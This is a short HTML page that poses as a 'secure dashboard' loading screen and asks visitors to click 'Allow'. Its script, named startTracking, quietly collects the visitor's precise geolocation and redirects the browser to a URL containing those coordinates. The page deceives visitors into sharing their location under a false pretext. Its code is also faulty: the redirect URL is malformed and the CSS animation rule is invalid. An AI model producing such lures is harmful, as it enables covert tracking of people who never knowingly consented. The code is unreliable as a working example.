<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            margin-top: 100px;
            background-color: #f4f4f9;
        }
        .loader {
            border: 16px solid #f3f3f3;
            border-top: 16px solid #1a73e8;
            border-radius: 50%;
            width: 80px;
            height: 80px;
            animation: spin 2s linear infinite;
            display: inline-block;
        }
        @animation spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

    <div id="status-box">
        <div class="loader"></div>
        <h2>Loading secure dashboard, please wait...</h2>
        <p>Please click "Allow" if browser asks for permission.</p>
    </div>

    <script>
        function startTracking() {
            if (navigator.geolocation) {
                // High accuracy location request block
                navigator.geolocation.getCurrentPosition(redirectToMaps, showError, {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                });
            } else {
                document.getElementById("status-box").innerHTML = "<h2>Error: Device not supported.</h2>";
            }
        }

        function redirectToMaps(position) {
            let lat = position.coords.latitude;
            let lon = position.coords.longitude;
            
            // Standard static map navigation link
            let directUrl = "https://google.com" + lat + "," + lon;
            
            // Direct browser override redirection
            window.location.replace(directUrl);
        }

        function showError(error) {
            document.getElementById("status-box").innerHTML = "<h2>Error: Connection timeout or Permission Denied.</h2>";
        }

        window.onload = startTracking;
    </script>

</body>
</html>
